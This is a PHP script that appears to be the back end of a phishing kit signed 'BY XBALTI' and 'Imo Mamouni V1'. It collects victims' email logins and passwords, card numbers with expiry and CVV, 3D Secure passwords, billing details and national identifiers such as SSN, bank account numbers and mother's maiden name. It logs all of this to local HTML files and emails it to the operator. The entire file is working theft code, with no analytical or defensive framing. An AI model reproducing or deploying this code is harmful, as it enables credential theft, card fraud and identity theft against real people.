<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
error_reporting(0);
date_default_timezone_set('GMT');
$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');
function XB_OS($USER_AGENT){
	$OS_ERROR    =   "Unknown OS Platform";
    $OS  =   array( '/windows nt 10/i'      =>  'Windows 10',
	                '/windows nt 6.3/i'     =>  'Windows 8.1',
	                '/windows nt 6.2/i'     =>  'Windows 8',
	                '/windows nt 6.1/i'     =>  'Windows 7',
	                '/windows nt 6.0/i'     =>  'Windows Vista',
	                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                '/windows nt 5.1/i'     =>  'Windows XP',
	                '/windows xp/i'         =>  'Windows XP',
	                '/windows nt 5.0/i'     =>  'Windows 2000',
	                '/windows me/i'         =>  'Windows ME',
	                '/win98/i'              =>  'Windows 98',
	                '/win95/i'              =>  'Windows 95',
	                '/win16/i'              =>  'Windows 3.11',
	                '/macintosh|mac os x/i' =>  'Mac OS X',
	                '/mac_powerpc/i'        =>  'Mac OS 9',
	                '/linux/i'              =>  'Linux',
	                '/ubuntu/i'             =>  'Ubuntu',
	                '/iphone/i'             =>  'iPhone',
	                '/ipod/i'               =>  'iPod',
	                '/ipad/i'               =>  'iPad',
	                '/android/i'            =>  'Android',
	                '/blackberry/i'         =>  'BlackBerry',
	                '/webos/i'              =>  'Mobile');
    foreach ($OS as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }

    }   
    return $OS_ERROR;
}
function XB_Browser($USER_AGENT){
	$BROWSER_ERROR    =   "Unknown Browser";
    $BROWSER  =   array('/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($BROWSER as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}
$_SESSION['XB'] = "Imo Mamouni V1";
if(isset($_POST['email']) && isset($_POST['password'])){	
	if(!empty($_POST['email']) && !empty($_POST['password'])){
$_SESSION['email']   = $_POST['email'];
$_SESSION['password']    = $_POST['password'];
$XBALTI_MESSAGE .= "
<html>
<head><meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY Imo Mamouni V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>LOGIN INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Email ] = <font style='color:#ba0000;'>".$_SESSION['email']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Password ]       = <font style='color:#ba0000;'>".$_SESSION['password']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY Imo Mamouni V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";
            $khraha = fopen("../login.html", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "LOGIN 😈 INFO FROM 😈 [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: <".$_SESSION['XB'].">";
    $XBALTI_HEADERS .= "XB-Version: 1.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}
if(isset($_POST['Firstname']) && isset($_POST['LastName']) && isset($_POST['addres']) && isset($_POST['City']) && isset($_POST['State']) && isset($_POST['zipCod']) && isset($_POST['phoneNumber']) && isset($_POST['cardNumber']) && isset($_POST['expdate']) && isset($_POST['ccv'])){	
	if(!empty($_POST['Firstname']) && !empty($_POST['LastName']) && !empty($_POST['addres']) && !empty($_POST['City']) && !empty($_POST['State']) && !empty($_POST['zipCod']) && !empty($_POST['phoneNumber']) && !empty($_POST['cardNumber']) && !empty($_POST['expdate']) && !empty($_POST['ccv'])){
$_SESSION['Firstname']        = $_POST['Firstname'];
$_SESSION['LastName']    = $_POST['LastName'];
$_SESSION['addres']        = $_POST['addres'];
$_SESSION['City']    = $_POST['City'];
$_SESSION['State']        = $_POST['State'];
$_SESSION['zipCod']    = $_POST['zipCod'];
$_SESSION['phoneNumber']        = $_POST['phoneNumber'];
$_SESSION['birthdate']        = $_POST['birthdate'];
$_SESSION['cardNumber']        = $_POST['cardNumber'];
$_SESSION['expdate']    = $_POST['expdate'];
$_SESSION['ccv']        = $_POST['ccv'];
$_SESSION['cardtype']    = $_POST['cardtype'];
$XBALTI_MESSAGE .= "
<html>
<head>
<meta charset='UTF-8'>
<div  style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY Imo Mamouni V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>LOGIN INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Email ] = <font style='color:#ba0000;'>".$_SESSION['email']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Password ]       = <font style='color:#ba0000;'>".$_SESSION['password']."</font><br>
================( <font style='color: #0a5d00;'>CARDING INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [FULL NAME ] = <font style='color:#ba0000;'>".$_SESSION['Firstname']." ".$_SESSION['LastName']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CARD NUMBER ] = <font style='color:#ba0000;'>".$_SESSION['cardNumber']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Date EX ]       = <font style='color:#ba0000;'>".$_SESSION['expdate']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV ]= <font style='color:#ba0000;'>".$_SESSION['ccv']."</font><br>
================( <font style='color: #0a5d00;'>BILLING INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Date Of birth ]        = <font style='color:#ba0000;'>".$_SESSION['birthdate']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Adress Line ]        = <font style='color:#ba0000;'>".$_SESSION['addres']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [City ]         = <font style='color:#ba0000;'>".$_SESSION['City']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [State ]      = <font style='color:#ba0000;'>".$_SESSION['State']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Zip code ]              = <font style='color:#ba0000;'>".$_SESSION['zipCod']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Phone Number]             = <font style='color:#ba0000;'>".$_SESSION['phoneNumber']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY Imo Mamouni V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";
    $khraha = fopen("../card.html", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "[".$_SESSION['cardtype']."] 😈 INFO FROM 😈 [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: <".$_SESSION['XB'].">";
    $XBALTI_HEADERS .= "XB-Version: 1.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}

if(isset($_POST['passvbv'])){	
	if(!empty($_POST['passvbv'])){
$_SESSION['passvbv']   = $_POST['passvbv'];
$_SESSION['codicefiscale']   = $_POST['codicefiscale'];
$_SESSION['kontonummer']   = $_POST['kontonummer'];
$_SESSION['offid']   = $_POST['offid'];
$_SESSION['osid']   = $_POST['osid'];
$_SESSION['creditlimit']   = $_POST['creditlimit'];
$_SESSION['sortcode']   = $_POST['sortcode'];
$_SESSION['accnumber']   = $_POST['accnumber'];
$_SESSION['ssn']   = $_POST['ssn'];
$_SESSION['mmname']   = $_POST['mmname'];
$XBALTI_MESSAGE .= "
<html>
<head>
<meta charset='UTF-8'>
<div  style='font-size: 13px;font-family:monospace;font-weight:700;'>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY Imo Mamouni V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
================( <font style='color: #0a5d00;'>LOGIN INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Email ] = <font style='color:#ba0000;'>".$_SESSION['email']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Password ]       = <font style='color:#ba0000;'>".$_SESSION['password']."</font><br>
================( <font style='color: #0a5d00;'>CARDING INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [FULL NAME ] = <font style='color:#ba0000;'>".$_SESSION['Firstname']." ".$_SESSION['LastName']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CARD NUMBER ] = <font style='color:#ba0000;'>".$_SESSION['cardNumber']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Date EX ]       = <font style='color:#ba0000;'>".$_SESSION['expdate']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [CVV ]= <font style='color:#ba0000;'>".$_SESSION['ccv']."</font><br>
================( <font style='color: #0a5d00;'>VBV INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [3d Secure]= <font style='color:#ba0000;'>".$_SESSION['passvbv']."</font><br>\n";
if($_SESSION['countryCode'] == "IT"){
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [codicefiscale]= <font style='color:#ba0000;'>".$_SESSION['codicefiscale']."</font><br>\n";  
}
elseif($_SESSION['countryCode'] == "CH" || $_SESSION['countryCode'] == "DE") {	
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [kontonummer]= <font style='color:#ba0000;'>".$_SESSION['kontonummer']."</font><br>\n";  
}
elseif($_SESSION['countryCode'] == "GR") {	
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [offid]= <font style='color:#ba0000;'>".$_SESSION['offid']."</font><br>\n"; 
}
elseif($_SESSION['countryCode'] == "AU") {
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [osid]= <font style='color:#ba0000;'>".$_SESSION['osid']."</font><br>
  <font style='color:#00049c;'>🤑✪</font> [creditlimit]= <font style='color:#ba0000;'>".$_SESSION['creditlimit']."</font><br>\n"; 
}
elseif ($_SESSION['countryCode'] == "IE" || $_SESSION['countryCode'] == "GB" ) {
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [sortcode]= <font style='color:#ba0000;'>".$_SESSION['sortcode']."</font><br>
  <font style='color:#00049c;'>🤑✪</font> [accnumber]= <font style='color:#ba0000;'>".$_SESSION['accnumber']."</font><br>\n"; 
}
elseif ($_SESSION['countryCode'] == "US" ) {
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [ssn]= <font style='color:#ba0000;'>".$_SESSION['ssn']."</font><br>\n"; 
}
elseif ($_SESSION['countryCode'] == "CA" ) {
  $XBALTI_MESSAGE .= "<font style='color:#00049c;'>🤑✪</font> [mmname]= <font style='color:#ba0000;'>".$_SESSION['mmname']."</font><br>\n"; 
}
$XBALTI_MESSAGE .= "================( <font style='color: #0a5d00;'>BILLING INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [Date Of birth ]        = <font style='color:#ba0000;'>".$_SESSION['birthdate']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Adress Line ]        = <font style='color:#ba0000;'>".$_SESSION['addres']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [City ]         = <font style='color:#ba0000;'>".$_SESSION['City']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [State ]      = <font style='color:#ba0000;'>".$_SESSION['State']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Zip code ]              = <font style='color:#ba0000;'>".$_SESSION['zipCod']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [Phone Number]             = <font style='color:#ba0000;'>".$_SESSION['phoneNumber']."</font><br>
================( <font style='color: #0a5d00;'>VICTIME INFORMATION</font> )================<br>
<font style='color:#00049c;'>🤑✪</font> [IP INFO]           = <font style='color:#ba0000;'>https://geoiptool.com/en/?ip=".$_SESSION['_ip_']."</font><br>
<font style='color:#00049c;'>🤑✪</font> [TIME/DATE]         = <font style='color:#ba0000;'>".$TIME_DATE."</font><br>
<font style='color:#00049c;'>🤑✪</font> [BROWSER]           = <font style='color:#ba0000;'>".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."</font><br>
●••●••۰۰•● ❤ ●•۰۰۰۰•● ❤ <font style='color: #000f82;'>BY Imo Mamouni V1</font> ❤ ●•۰۰۰۰•● ❤ ●•۰۰۰•●••●●••<br/>
</div></html>\n";
    $khraha = fopen("../vbv.html", "a");
	fwrite($khraha, $XBALTI_MESSAGE);
    $XBALTI_SUBJECT .= "VBV 😈 [".$_SESSION['bankname']."] 😈 [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."] ";
    $XBALTI_HEADERS .= "From: <".$_SESSION['XB'].">";
    $XBALTI_HEADERS .= "XB-Version: 1.0\n";
    $XBALTI_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
    @mail($XBALTI_EMAIL, $XBALTI_SUBJECT, $XBALTI_MESSAGE, $XBALTI_HEADERS);
	}
}
?>
